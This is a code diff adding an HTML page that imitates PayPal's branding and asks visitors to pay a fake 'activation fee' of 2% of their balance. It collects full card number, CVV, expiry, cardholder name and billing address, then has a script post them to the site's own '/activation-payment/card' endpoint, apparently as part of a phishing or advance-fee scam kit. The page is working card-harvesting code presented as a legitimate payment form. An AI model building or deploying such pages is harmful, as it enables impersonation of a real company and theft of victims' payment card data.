@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Payment - PayPal Activation</title>
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .payment-container {
+            max-width: 600px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+        }
+        
+        .payment-header {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid #f0f0f0;
+        }
+        
+        .payment-header h1 {
+            color: #003087;
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .payment-header p {
+            color: #666;
+            font-size: 1rem;
+        }
+        
+        .payment-amount {
+            background: linear-gradient(135deg, #0070ba, #009cde);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        
+        .payment-amount-label {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        
+        .payment-amount-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin: 0.5rem 0;
+        }
+        
+        .payment-form {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .form-label {
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #333;
+            font-size: 0.9rem;
+        }
+        
+        .form-input {
+            padding: 12px 15px;
+            border: 2px solid #e0e3e7;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+        
+        .form-input:focus {
+            border-color: #0070ba;
+            outline: none;
+        }
+        
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .payment-method {
+            border: 2px solid #e0e3e7;
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payment-method.active {
+            border-color: #0070ba;
+            background: rgba(0, 112, 186, 0.05);
+        }
+        
+        .payment-method i {
+            font-size: 2rem;
+            color: #666;
+            margin-bottom: 0.5rem;
+        }
+        
+        .payment-method.active i {
+            color: #0070ba;
+        }
+        
+        .payment-method span {
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(135deg, #0070ba, #009cde);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1rem;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #005ea6, #0070ba);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 112, 186, 0.3);
+        }
+        
+        .submit-btn.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        
+        .back-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #f0f0f0;
+            color: #333;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .back-btn:hover {
+            background: #e0e0e0;
+        }
+        
+        .info-note {
+            background: #e8f4fd;
+            border: 1px solid #b6d4fe;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            color: #084298;
+        }
+        
+        .info-note i {
+            color: #0d6efd;
+            margin-right: 10px;
+        }
+        
+        .warning-note {
+            background: #fff3cd;
+            border: 1px solid #ffecb5;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            color: #856404;
+        }
+        
+        .warning-note i {
+            color: #ffc107;
+            margin-right: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .payment-container {
+                margin: 1rem;
+                padding: 1rem;
+            }
+            
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            
+            .payment-methods {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        .form-hint {
+            font-size: 0.8rem;
+            color: #666;
+            margin-top: 4px;
+        }
+        
+        .required-field::after {
+            content: " *";
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav-main">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="/assets/logo.png" alt="PayPal Logo">
+                <span>PayPal</span>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container">
+        <div class="payment-container">
+            <div class="payment-header">
+                <h1>Card Payment Activation</h1>
+                <p>Complete your PayPal account activation with card payment</p>
+            </div>
+            
+            <div class="payment-amount">
+                <div class="payment-amount-label">Activation Fee (2% of your balance)</div>
+                <div class="payment-amount-value" id="activationAmount">$0.00</div>
+                <div class="payment-amount-label">Will be deducted from your balance</div>
+            </div>
+            
+            <div class="warning-note">
+                <i class="fas fa-exclamation-triangle"></i>
+                <strong>Important:</strong> Enter your card information carefully.
+            </div>
+            
+            <form id="cardPaymentForm" class="payment-form">
+                <div class="form-group">
+                    <label class="form-label required-field">Card Number</label>
+                    <input type="text" class="form-input" id="cardNumber" 
+                           placeholder="1234 5678 9012 3456" 
+                           maxlength="19"
+                           required>
+                    <small class="form-hint">Enter 16-digit card number</small>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label required-field">Cardholder Name</label>
+                    <input type="text" class="form-input" id="cardholderName" 
+                           placeholder="John Doe" 
+                           required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required-field">Expiry Date</label>
+                        <input type="text" class="form-input" id="expiry" 
+                               placeholder="MM/YY" 
+                               maxlength="5"
+                               required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label required-field">CVV</label>
+                        <input type="text" class="form-input" id="cvv" 
+                               placeholder="123" 
+                               maxlength="4"
+                               required>
+                        <small class="form-hint">3 or 4 digits on back/front of card</small>
+                    </div>
+                </div>
+                
+                <div class="info-note">
+                    <i class="fas fa-home"></i>
+                    <strong>Billing Address:</strong> Please enter the billing address associated with your card.
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label required-field">Address</label>
+                    <input type="text" class="form-input" id="address" 
+                           placeholder="123 Main St" 
+                           required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required-field">City</label>
+                        <input type="text" class="form-input" id="city" 
+                               placeholder="New York" 
+                               required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label required-field">State</label>
+                        <input type="text" class="form-input" id="state" 
+                               placeholder="NY" 
+                               required>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required-field">ZIP Code</label>
+                        <input type="text" class="form-input" id="zipCode" 
+                               placeholder="10001" 
+                               required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label required-field">Country</label>
+                        <select class="form-input" id="country" required>
+                            <option value="US">United States</option>
+                            <option value="UK">United Kingdom</option>
+                            <option value="CA">Canada</option>
+                            <option value="AU">Australia</option>
+                            <option value="DE">Germany</option>
+                            <option value="FR">France</option>
+                            <option value="NG">Nigeria</option>
+                            <option value="IN">India</option>
+                            <option value="BR">Brazil</option>
+                            <option value="ZA">South Africa</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <i class="fas fa-lock"></i> Pay Activation Fee
+                </button>
+                
+                <a href="/activation-payment" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Back to Payment Methods
+                </a>
+            </form>
+            
+            <div id="message" style="margin-top: 1rem;"></div>
+        </div>
+    </div>
+    
+    <script>
+        // Load user data and calculate activation fee
+        async function loadUserData() {
+            try {
+                const response = await fetch('/api/user');
+                if (!response.ok) throw new Error('Failed to load user data');
+                
+                const user = await response.json();
+                const activationFee = user.balance * 0.02;
+                
+                document.getElementById('activationAmount').textContent = `$${activationFee.toFixed(2)}`;
+                
+                return user;
+            } catch (error) {
+                console.error('Error loading user data:', error);
+                document.getElementById('message').innerHTML = `
+                    <div style="background: #ffebee; color: #c62828; padding: 1rem; border-radius: 8px;">
+                        Error loading user data. Please refresh the page.
+                    </div>
+                `;
+            }
+        }
+        
+        // Format card number with spaces
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            
+            e.target.value = formatted.substring(0, 19);
+        });
+        
+        // Format expiry date
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+        
+        // Handle form submission
+        document.getElementById('cardPaymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const messageDiv = document.getElementById('message');
+            
+            // Get form values
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardholderName = document.getElementById('cardholderName').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zipCode = document.getElementById('zipCode').value;
+            const country = document.getElementById('country').value;
+            
+            // Basic validation
+            if (cardNumber.length !== 16) {
+                showMessage('Please enter a valid 16-digit card number', 'error');
+                return;
+            }
+            
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                showMessage('Please enter expiry date in MM/YY format', 'error');
+                return;
+            }
+            
+            if (!/^\d{3,4}$/.test(cvv)) {
+                showMessage('Please enter a valid CVV (3 or 4 digits)', 'error');
+                return;
+            }
+            
+            if (!address.trim()) {
+                showMessage('Please enter billing address', 'error');
+                return;
+            }
+            
+            // Show loading
+            submitBtn.classList.add('loading');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            
+            try {
+                const response = await fetch('/activation-payment/card', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        cardNumber,
+                        cardholderName,
+                        expiry,
+                        cvv,
+                        address,
+                        city,
+                        state,
+                        zipCode,
+                        country
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showMessage(result.message, 'success');
+                    submitBtn.innerHTML = '<i class="fas fa-check"></i> Payment Successful!';
+                    
+                    // Redirect to dashboard after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = '/dashboard';
+                    }, 3000);
+                } else {
+                    showMessage(result.error || 'Payment failed', 'error');
+                    submitBtn.classList.remove('loading');
+                    submitBtn.innerHTML = '<i class="fas fa-lock"></i> Pay Activation Fee';
+                }
+            } catch (error) {
+                console.error('Payment error:', error);
+                showMessage('Network error. Please try again.', 'error');
+                submitBtn.classList.remove('loading');
+                submitBtn.innerHTML = '<i class="fas fa-lock"></i> Pay Activation Fee';
+            }
+        });
+        
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            const color = type === 'success' ? '#4caf50' : '#f44336';
+            const bgColor = type === 'success' ? '#e8f5e9' : '#ffebee';
+            
+            messageDiv.innerHTML = `
+                <div style="background: ${bgColor}; color: ${color}; padding: 1rem; border-radius: 8px; border-left: 4px solid ${color};">
+                    <strong>${type === 'success' ? '✓' : '✗'}</strong> ${text}
+                </div>
+            `;
+            
+            // Auto-hide error messages after 5 seconds
+            if (type === 'error') {
+                setTimeout(() => {
+                    messageDiv.innerHTML = '';
+                }, 5000);
+            }
+        }
+        
+        // Load user data on page load
+        document.addEventListener('DOMContentLoaded', loadUserData);
+    </script>
+</body>
+</html>
